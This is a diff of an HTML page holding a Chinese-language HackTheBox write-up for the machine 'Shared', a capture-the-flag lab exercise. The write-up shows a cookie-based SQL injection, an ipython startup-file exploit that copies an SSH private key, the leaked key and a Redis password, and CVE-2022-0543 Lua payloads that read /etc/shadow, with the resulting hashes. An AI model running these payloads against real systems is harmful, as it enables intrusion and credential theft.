@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;483  10.10.11.172   端口扫描22,80,443: 12345678910111213141516171819202122232425262728293031$ nmap -sC -sV -Pn 10.10.11.172Starting Nmap 7.92 ( https:">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;483  10.10.11.172                                                                                                              端口扫描22,80,443: 1234">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Shared - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2022/09/04/Shared-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;483  10.10.11.172   端口扫描22,80,443: 12345678910111213141516171819202122232425262728293031$ nmap -sC -sV -Pn 10.10.11.172Starting Nmap 7.92 ( https:">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;483  10.10.11.172                                                                                                              端口扫描22,80,443: 1234">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022090401.jpg">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022090402.jpg">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022090403.jpg">
@@ -131,7 +131,7 @@
         
             <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link2"></i>
+                <i class="icon icon-lg icon-link"></i>
                 About
               </a>
             </li>
@@ -221,7 +221,14 @@
 </li>
 <li><h2 id="10-10-11-172"><a href="#10-10-11-172" class="headerlink" title="10.10.11.172"></a>10.10.11.172</h2></li>
 </ul>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022090401.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022090401.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>22,80,443:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV -Pn 10.10.11.172</span></span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-04 13:19 CST</span><br><span class="line">Nmap scan report for 10.10.11.172</span><br><span class="line">Host is up (0.34s latency).</span><br><span class="line">Not shown: 997 closed tcp ports (conn-refused)</span><br><span class="line">PORT    STATE SERVICE  VERSION</span><br><span class="line">22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   3072 91:e8:35:f4:69:5f:c2:e2:0e:27:46:e2:a6:b6:d8:65 (RSA)</span><br><span class="line">|   256 cf:fc:c4:5d:84:fb:58:0b:be:2d:ad:35:40:9d:c3:51 (ECDSA)</span><br><span class="line">|_  256 a3:38:6d:75:09:64:ed:70:cf:17:49:9a:dc:12:6d:11 (ED25519)</span><br><span class="line">80/tcp  open  http     nginx 1.18.0</span><br><span class="line">|_http-title: Did not follow redirect to http://shared.htb</span><br><span class="line">|_http-server-header: nginx/1.18.0</span><br><span class="line">443/tcp open  ssl/http nginx 1.18.0</span><br><span class="line">|_http-title: 400 The plain HTTP request was sent to HTTPS port</span><br><span class="line">| ssl-cert: Subject: commonName=*.shared.htb/organizationName=HTB/stateOrProvinceName=None/countryName=US</span><br><span class="line">| Not valid before: 2022-03-20T13:37:14</span><br><span class="line">|_Not valid after:  2042-03-15T13:37:14</span><br><span class="line">| tls-nextprotoneg:</span><br><span class="line">|   h2</span><br><span class="line">|_  http/1.1</span><br><span class="line">| tls-alpn:</span><br><span class="line">|   h2</span><br><span class="line">|_  http/1.1</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">|_http-server-header: nginx/1.18.0</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 133.58 seconds</span><br></pre></td></tr></table></figure>
 
@@ -231,26 +238,77 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.172 shared.htb</span><br></pre></td></tr></table></figure>
 
 <p>一个商城，测试添加后结算会到另一个子域名：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022090402.jpg" alt=""></p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022090403.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022090402.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022090403.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="checkout-shared-htb"><a href="#checkout-shared-htb" class="headerlink" title="checkout.shared.htb"></a>checkout.shared.htb</h2><p> 同样加hosts后继续流程：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.172 shared.htb checkout.shared.htb</span><br></pre></td></tr></table></figure>
 
 <p>注意到商品信息存储在cookie中：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022090404.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022090404.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+
+
 <h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><p>尝试修改cookie，刷新，基础的sql注入：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;&#39; and 0&#x3D;1 union select 1,2,3-- -&quot;:&quot;1&quot;&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022090405.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022090405.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>后续就是一步步获取信息</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"' and 0=1 union select 1,database(),3-- -"</span>:<span class="string">"1"</span>&#125;</span><br><span class="line">checkout</span><br><span class="line"></span><br><span class="line">&#123;<span class="attr">"' and 0=1 union select 1,table_name,table_schema from information_schema.tables where table_schema='checkout'-- -"</span>:<span class="string">"1"</span>&#125;</span><br><span class="line">user</span><br><span class="line"></span><br><span class="line">&#123;<span class="attr">"' and 0=1 union select 1,username,2 from checkout.user-- -"</span>:<span class="string">"1"</span>&#125;</span><br><span class="line">james_mason</span><br><span class="line"></span><br><span class="line">&#123;<span class="attr">"' and 0=1 union select 1,password,2 from checkout.user-- -"</span>:<span class="string">"1"</span>&#125;</span><br><span class="line">fc895d4eddc2fc12f995e18c865cf273</span><br><span class="line"># 破解出密码</span><br><span class="line">Soleil101</span><br></pre></td></tr></table></figure>
 
 <h1 id="james-mason"><a href="#james-mason" class="headerlink" title="james_mason"></a>james_mason</h1><p>得到的账号密码ssh登录,在developer组中：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022090406.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022090406.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="scripts-review"><a href="#scripts-review" class="headerlink" title="scripts_review"></a>scripts_review</h2><p>查看developer有权限的文件，发现scripts_review目录，但里面是空的：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022090407.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022090407.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>运行pspy64，发现uid 1001用户进入这个目录后运行ipython：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022090408.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022090408.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="ipython"><a href="#ipython" class="headerlink" title="ipython"></a>ipython</h2><p>搜索发现相关漏洞：</p>
 <ul>
 <li>Execution with Unnecessary Privileges in ipython · Advisory · ipython/ipython<br><a href="https://github.com/ipython/ipython/security/advisories/GHSA-pq7m-3gw7-gq5x" target="_blank" rel="noopener">https://github.com/ipython/ipython/security/advisories/GHSA-pq7m-3gw7-gq5x</a></li>
@@ -258,24 +316,59 @@
 <p>根据资料，进入对应目录，创建恶意文件，等待执行，得到ssh私钥：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir -m 777 profile_default</span><br><span class="line">mkdir -m 777 profile_default/startup</span><br><span class="line">echo "import os; os.system('cat ~/.ssh/id_rsa &gt; /tmp/key')" &gt; profile_default/startup/foo.py</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022090409.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022090409.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="dan-smith-id-rsa"><a href="#dan-smith-id-rsa" class="headerlink" title="dan_smith_id_rsa"></a>dan_smith_id_rsa</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAYEAvWFkzEQw9usImnZ7ZAzefm34r+54C9vbjymNl4pwxNJPaNSHbdWO</span><br><span class="line">+&#x2F;+OPh0&#x2F;KiPg70GdaFWhgm8qEfFXLEXUbnSMkiB7JbC3fCfDCGUYmp9QiiQC0xiFeaSbvZ</span><br><span class="line">FwA4NCZouzAW1W&#x2F;ZXe60LaAXVAlEIbuGOVcNrVfh+XyXDFvEyre5BWNARQSarV5CGXk6ku</span><br><span class="line">sjib5U7vdKXASeoPSHmWzFismokfYy8Oyupd8y1WXA4jczt9qKUgBetVUDiai1ckFBePWl</span><br><span class="line">4G3yqQ2ghuHhDPBC+lCl3mMf1XJ7Jgm3sa+EuRPZFDCUiTCSxA8LsuYrWAwCtxJga31zWx</span><br><span class="line">FHAVThRwfKb4Qh2l9rXGtK6G05+DXWj+OAe&#x2F;Q34gCMgFG4h3mPw7tRz2plTRBQfgLcrvVD</span><br><span class="line">oQtePOEc&#x2F;XuVff+kQH7PU9J1c0F&#x2F;hC7gbklm2bA8YTNlnCQ2Z2Z+HSzeEXD5rXtCA69F4E</span><br><span class="line">u1FCodLROALNPgrAM4LgMbD3xaW5BqZWrm24uP&#x2F;lAAAFiPY2n2r2Np9qAAAAB3NzaC1yc2</span><br><span class="line">EAAAGBAL1hZMxEMPbrCJp2e2QM3n5t+K&#x2F;ueAvb248pjZeKcMTST2jUh23Vjvv&#x2F;jj4dPyoj</span><br><span class="line">4O9BnWhVoYJvKhHxVyxF1G50jJIgeyWwt3wnwwhlGJqfUIokAtMYhXmkm72RcAODQmaLsw</span><br><span class="line">FtVv2V3utC2gF1QJRCG7hjlXDa1X4fl8lwxbxMq3uQVjQEUEmq1eQhl5OpLrI4m+VO73Sl</span><br><span class="line">wEnqD0h5lsxYrJqJH2MvDsrqXfMtVlwOI3M7failIAXrVVA4motXJBQXj1peBt8qkNoIbh</span><br><span class="line">4QzwQvpQpd5jH9VyeyYJt7GvhLkT2RQwlIkwksQPC7LmK1gMArcSYGt9c1sRRwFU4UcHym</span><br><span class="line">+EIdpfa1xrSuhtOfg11o&#x2F;jgHv0N+IAjIBRuId5j8O7Uc9qZU0QUH4C3K71Q6ELXjzhHP17</span><br><span class="line">lX3&#x2F;pEB+z1PSdXNBf4Qu4G5JZtmwPGEzZZwkNmdmfh0s3hFw+a17QgOvReBLtRQqHS0TgC</span><br><span class="line">zT4KwDOC4DGw98WluQamVq5tuLj&#x2F;5QAAAAMBAAEAAAGBAK05auPU9BzHO6Vd&#x2F;tuzUci&#x2F;ep</span><br><span class="line">wiOrhOMHSxA4y72w6NeIlg7Uev8gva5Bc41VAMZXEzyXFn8kXGvOqQoLYkYX1vKi13fG0r</span><br><span class="line">SYpNLH5&#x2F;SpQUaa0R52uDoIN15+bsI1NzOsdlvSTvCIUIE1GKYrK2t41lMsnkfQsvf9zPtR</span><br><span class="line">1TA+uLDcgGbHNEBtR7aQ41E9rDA62NTjvfifResJZre&#x2F;NFFIRyD9+C0az9nEBLRAhtTfMC</span><br><span class="line">E7cRkY0zDSmc6vpn7CTMXOQvdLao1WP2k&#x2F;dSpwiIOWpSLIbpPHEKBEFDbKMeJ2G9uvxXtJ</span><br><span class="line">f3uQ14rvy+tRTog&#x2F;B3&#x2F;PgziSb6wvHri6ijt6N9PQnKURVlZbkx3yr397oVMCiTe2FA+I&#x2F;Y</span><br><span class="line">pPtQxpmHjyClPWUsN45PwWF+D0ofLJishFH7ylAsOeDHsUVmhgOeRyywkDWFWMdz+Ke+XQ</span><br><span class="line">YWfa9RiI5aTaWdOrytt2l3Djd1V1&#x2F;c62M1ekUoUrIuc5PS8JNlZQl7fyfMSZC9mL+iOQAA</span><br><span class="line">AMEAy6SuHvYofbEAD3MS4VxQ+uo7G4sU3JjAkyscViaAdEeLejvnn9i24sLWv9oE9&#x2F;UOgm</span><br><span class="line">2AwUg3cT7kmKUdAvBHsj20uwv8a1ezFQNN5vxTnQPQLTiZoUIR7FDTOkQ0W3hfvjznKXTM</span><br><span class="line">wictz9NZYWpEZQAuSX2QJgBJc1WNOtrgJscNauv7MOtZYclqKJShDd&#x2F;NHUGPnNasHiPjtN</span><br><span class="line">CRr7thGmZ6G9yEnXKkjZJ1Neh5Gfx31fQBaBd4XyVFsvUSphjNAAAAwQD4Yntc2zAbNSt6</span><br><span class="line">GhNb4pHYwMTPwV4DoXDk+wIKmU7qs94cn4o33PAA7ClZ3ddVt9FTkqIrIkKQNXLQIVI7EY</span><br><span class="line">Jg2H102ohz1lPWC9aLRFCDFz3bgBKluiS3N2SFbkGiQHZoT93qn612b+VOgX1qGjx1lZ&#x2F;H</span><br><span class="line">I152QStTwcFPlJ0Wu6YIBcEq4Rc+iFqqQDq0z0MWhOHYvpcsycXk&#x2F;hIlUhJNpExIs7TUKU</span><br><span class="line">SJyDK0JWt2oKPVhGA62iGGx2+cnGIoROcAAADBAMMvzNfUfamB1hdLrBS&#x2F;9R+zEoOLUxbE</span><br><span class="line">SENrA1qkplhN&#x2F;wPta&#x2F;wDX0v9hX9i+2ygYSicVp6CtXpd9KPsG0JvERiVNbwWxD3gXcm0BE</span><br><span class="line">wMtlVDb4WN1SG5Cpyx9ZhkdU+t0gZ225YYNiyWob3IaZYWVkNkeijRD+ijEY4rN41hiHlW</span><br><span class="line">HPDeHZn0yt8fTeFAm+Ny4+8+dLXMlZM5quPoa0zBbxzMZWpSI9E6j6rPWs2sJmBBEKVLQs</span><br><span class="line">tfJMvuTgb3NhHvUwAAAAtyb290QHNoYXJlZAECAwQFBg&#x3D;&#x3D;</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
 
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>使用得到的私钥登录dan_smith，得到user flag：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022090410.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022090410.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><p>当前用户在sysadmin组，查找相关文件， 发现一个从redis获取信息的二进制文件，第一行输出表明了这个文件内置有密码用于登录：：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022090411.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022090411.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="redis-password"><a href="#redis-password" class="headerlink" title="redis password"></a>redis password</h2><p>这个二进制文件的机制是运行时使用内置密码连接本地redis，从中获取信息，如果我们把文件下载下来在本地运行，监听6379端口，那就可以很容易的获取密码：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">F2WHqJUz2WEz&#x3D;Gqq</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022090412.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022090412.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="CVE-2022-0543"><a href="#CVE-2022-0543" class="headerlink" title="CVE-2022-0543"></a>CVE-2022-0543</h2><p>另外当前环境信息也符合CVE-2022-0543的条件，所以就是使用得到的密码连接，利用CVE-2022-0543执行任意命令：</p>
 <ul>
 <li>How To Fix CVE-2022-0543- A Critical Lua Sandbox Escape Vulnerability In Redis - The Sec Master<br><a href="https://thesecmaster.com/how-to-fix-cve-2022-0543-a-critical-lua-sandbox-escape-vulnerability-in-redis/" target="_blank" rel="noopener">https://thesecmaster.com/how-to-fix-cve-2022-0543-a-critical-lua-sandbox-escape-vulnerability-in-redis/</a></li>
 </ul>
 <h1 id="提权-amp-root-flag"><a href="#提权-amp-root-flag" class="headerlink" title="提权 &amp; root flag"></a>提权 &amp; root flag</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli --pass F2WHqJUz2WEz=Gqq</span><br><span class="line"></span><br><span class="line">eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("cat /root/root.txt", "r"); local res = f:read("*a"); f:close(); return res' 0</span><br><span class="line"></span><br><span class="line">eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("cat /etc/shadow", "r"); local res = f:read("*a"); f:close(); return res' 0</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022090413.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022090413.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="shadow"><a href="#shadow" class="headerlink" title="shadow"></a>shadow</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root:$y$j9T$q&#x2F;qYCzzDEBdZXpRxCa6gL&#x2F;$XhNZBD56JUTsCniDDjj6UmwRnBc3A40AcbtqNzVEpJ4:19186:0:99999:7:::</span><br><span class="line">james_mason:$y$j9T$zJMiBXFlQaVLqD8B7hPR3.$ceN5vvW&#x2F;KTMQ.YeNjqT8UVo6TsKm&#x2F;Dl8P1uefK6v5A1:19071:0:99999:7:::</span><br><span class="line">dan_smith:$y$j9T$vFQT7yf8j9&#x2F;liKFLt3fr7&#x2F;$Fqyc1V0r3NrAH2JkdU6N6nEz1v5jm38wUUDbOkqZzsA:19186:0:99999:7:::</span><br></pre></td></tr></table></figure>
 
 
